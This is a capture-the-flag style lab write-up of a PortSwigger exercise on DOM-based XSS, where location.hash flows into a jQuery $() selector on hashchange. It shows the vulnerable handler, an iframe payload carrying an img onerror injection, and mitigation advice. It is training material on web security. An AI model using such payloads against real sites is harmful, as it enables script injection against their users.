# Lab07 - DOM XSS in jQuery Selector Sink Using Hashchange Event

## Objective

Exploit a DOM-Based XSS vulnerability where attacker-controlled data from:

```javascript
location.hash
```

is passed into a jQuery selector.

The goal is to execute:

```javascript
print()
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Apprentice |
| Source | location.hash |
| Sink | jQuery Selector $() |
| Context | Selector Injection |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application uses jQuery to automatically scroll to a post when:

```javascript
location.hash
```

changes.

User-controlled data is passed directly into:

```javascript
$()
```

without validation.

---

# Vulnerable Code Pattern

```javascript
$(window).on('hashchange',
function() {

var post =
$(location.hash);

post.get(0).scrollIntoView();

});
```

---

# Source → Sink Flow

```text
location.hash
        ↓
jQuery Selector
        ↓
$()
        ↓
Element Creation
        ↓
Event Execution
```

---

# Analysis

## Step 1

Open page source.

---

## Step 2

Search for:

```javascript
hashchange
```

---

Observation:

```javascript
$(location.hash)
```

used directly.

---

## Step 3

Identify Source

```javascript
location.hash
```

---

## Step 4

Identify Sink

```javascript
$()
```

---

## Step 5

Craft Payload

Need payload that:

```text
Creates Element
        ↓
Triggers Event
        ↓
Executes JavaScript
```

---

# Full Payload(s) Used

## Final Payload

```html
<iframe src="https://LAB-ID.web-security-academy.net/#<img src=x onerror=print()>">
</iframe>
```

---

## Hash Payload

```html
<img src=x onerror=print()>
```

---

# Why The Payload Works

Application performs:

```javascript
$(location.hash)
```

---

Hash becomes:

```html
#<img src=x onerror=print()>
```

---

jQuery interprets:

```html
<img src=x onerror=print()>
```

as HTML.

---

Execution Flow

```text
location.hash
        ↓
$()
        ↓
Image Created
        ↓
Image Load Fails
        ↓
onerror Fires
        ↓
print()
```

---

# Personal Analysis & Testing Process

## Initial Goal

Locate:

```javascript
location.hash
```

usage.

---

## Observation

Found:

```javascript
$(location.hash)
```

inside:

```javascript
hashchange
```

event handler.

---

## Key Realization

jQuery treats:

```html
<img>
```

input as HTML.

---

## Exploitation Strategy

Inject HTML through:

```text
location.hash
```

and trigger:

```text
hashchange
```

event.

---

## Result

```javascript
print()
```

executed.

Lab solved.

---

# Mitigation

Never pass untrusted data directly into:

```javascript
$()
```

Use:

```javascript
document.getElementById()
```

or validate selector input.

---

# Related Theory

- 17-dom-xss-in-jquery.md
- 15-sources-and-sinks.md

---

# Key Learnings

- jQuery selectors can become dangerous sinks.
- location.hash is a common DOM XSS source.
- hashchange handlers should be audited carefully.
- HTML injection through selectors can lead to execution.

Source:
location.hash

Sink:
$()

Trigger:
hashchange